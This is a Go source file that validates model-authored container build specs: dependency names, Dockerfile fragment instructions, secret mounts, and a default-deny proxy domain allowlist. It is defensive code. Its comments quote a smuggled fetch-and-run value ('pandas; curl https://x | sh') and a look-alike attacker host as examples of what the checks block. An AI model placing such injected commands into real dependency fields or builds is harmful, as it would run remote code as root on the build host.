package imagespec

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"github.com/skael-dev/skael/internal/eval/spec"
)

// ErrUnsafeDep is returned for a dependency string that could not be safely
// placed in a RUN instruction.
var ErrUnsafeDep = errors.New("imagespec: unsafe dependency")

// ErrUnsafeFragment is returned for a Dockerfile fragment using an instruction
// outside the safelist.
var ErrUnsafeFragment = errors.New("imagespec: unsafe Dockerfile fragment")

// depPattern is what an ordinary package name looks like across apt, pip and
// npm: a name, optionally scoped or versioned. Everything a shell would treat
// as syntax is outside it, and a leading dash is too — a dep is not a place to
// pass "--index-url".
var depPattern = regexp.MustCompile(`^@?[A-Za-z0-9][A-Za-z0-9._+/-]*(?:(?:==|@|=)[A-Za-z0-9][A-Za-z0-9._+-]*)?$`)

// ValidateDeps checks every declared dependency. These strings come from a
// model-authored spec and are interpolated into an image build's RUN
// instruction, which makes this a security boundary rather than a tidiness
// check: "pandas; curl https://x | sh" would otherwise execute at build time,
// as root, with the network on.
func ValidateDeps(d spec.DepsDecl) error {
	for _, group := range []struct {
		name string
		vals []string
	}{{"apt", d.Apt}, {"pip", d.Pip}, {"npm", d.Npm}} {
		for _, v := range group.vals {
			if v == "" {
				return fmt.Errorf("%w: empty %s dependency", ErrUnsafeDep, group.name)
			}
			if strings.Contains(v, "..") {
				return fmt.Errorf("%w: %s dependency %q contains a path traversal", ErrUnsafeDep, group.name, v)
			}
			if !depPattern.MatchString(v) {
				return fmt.Errorf("%w: %s dependency %q is not a plain package name", ErrUnsafeDep, group.name, v)
			}
		}
	}
	return nil
}

// fragmentSafelist is the set of Dockerfile instructions a task-declared
// fragment may use. FROM would escape the pinned base; ADD fetches URLs at
// build time; ONBUILD and VOLUME both act on images built later, outside the
// run this fragment belongs to.
var fragmentSafelist = map[string]bool{
	"RUN": true, "ENV": true, "COPY": true, "WORKDIR": true, "USER": true, "ARG": true,
}

// ValidateFragment checks a task-declared Dockerfile fragment instruction by
// instruction. The fragment is model-authored, so it is validated rather than
// trusted.
//
// A Dockerfile instruction can span several physical lines via a trailing
// backslash, so lines are first reassembled into logical lines before either
// check runs: the safelist check applies only to the keyword that starts a
// logical line (a continuation is not a new instruction, whatever its own
// first token looks like), while the build-secret check scans the whole
// reassembled line, because a "--mount=type=secret" flag can itself be split
// across a continuation.
func ValidateFragment(frag string) error {
	lines := strings.Split(frag, "\n")

	var logical strings.Builder
	logicalStart := 0
	continued := false

	check := func() error {
		t := strings.TrimSpace(logical.String())
		if t == "" {
			return nil
		}
		fields := strings.Fields(t)
		instr := strings.ToUpper(fields[0])
		if !fragmentSafelist[instr] {
			return fmt.Errorf("%w: line %d uses %s, which is not one of RUN, ENV, COPY, WORKDIR, USER, ARG", ErrUnsafeFragment, logicalStart, instr)
		}
		if strings.Contains(t, "--mount=type=secret") {
			return fmt.Errorf("%w: line %d mounts a build secret", ErrUnsafeFragment, logicalStart)
		}
		return nil
	}

	for i, line := range lines {
		t := strings.TrimSpace(line)

		if !continued {
			if t == "" || strings.HasPrefix(t, "#") {
				continue
			}
			logical.Reset()
			logicalStart = i + 1
		} else if logical.Len() > 0 {
			logical.WriteString(" ")
		}

		// The one signal that determines continuation in Dockerfile syntax is
		// a trailing backslash on the previous physical line — not what the
		// current line's text happens to start with.
		continued = strings.HasSuffix(t, "\\")
		t = strings.TrimSpace(strings.TrimSuffix(t, "\\"))
		logical.WriteString(t)

		if continued {
			continue
		}
		if err := check(); err != nil {
			return err
		}
	}
	if continued {
		// A fragment ending mid-continuation; check what was accumulated
		// rather than silently dropping it.
		return check()
	}
	return nil
}

// domainPattern is a hostname, optionally with a leading dot for a subdomain
// wildcard. The allowlist is the enforcement point for network policy, so a
// value that could carry proxy-configuration syntax is rejected rather than
// escaped.
var domainPattern = regexp.MustCompile(`^\.?[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)+$`)

// ProxyConfig renders the allowlist proxy's configuration and filter file,
// concatenated with the filter after a "#--- filter ---" marker so a driver can
// split them. Default-deny: a domain absent from the list is refused.
func ProxyConfig(allow []string) (string, error) {
	if len(allow) == 0 {
		return "", errors.New("imagespec: an allowlist proxy needs at least one domain")
	}
	for _, d := range allow {
		if !domainPattern.MatchString(d) {
			return "", fmt.Errorf("imagespec: %q is not a hostname", d)
		}
	}

	conf, err := baseFS.ReadFile("base/tinyproxy.conf.tmpl")
	if err != nil {
		panic(fmt.Sprintf("imagespec: %v", err))
	}

	var b strings.Builder
	b.Write(conf)
	b.WriteString("\n" + FilterMarker + "\n")
	for _, d := range sorted(allow) {
		// tinyproxy's filter is a regexp list; anchor each entry so
		// "api.anthropic.com" does not also permit "api.anthropic.com.evil.example",
		// and escape it with QuoteMeta so its literal dots stay literal dots
		// rather than becoming "any character" — an unescaped entry would also
		// let through a look-alike like "api-anthropic.com", which defeats a
		// proxy whose entire job is to be default-deny.
		fmt.Fprintf(&b, "(^|\\.)%s$\n", regexp.QuoteMeta(strings.TrimPrefix(d, ".")))
	}
	return b.String(), nil
}

// FilterMarker separates the proxy configuration from its filter file in
// ProxyConfig's output.
const FilterMarker = "#--- filter ---"
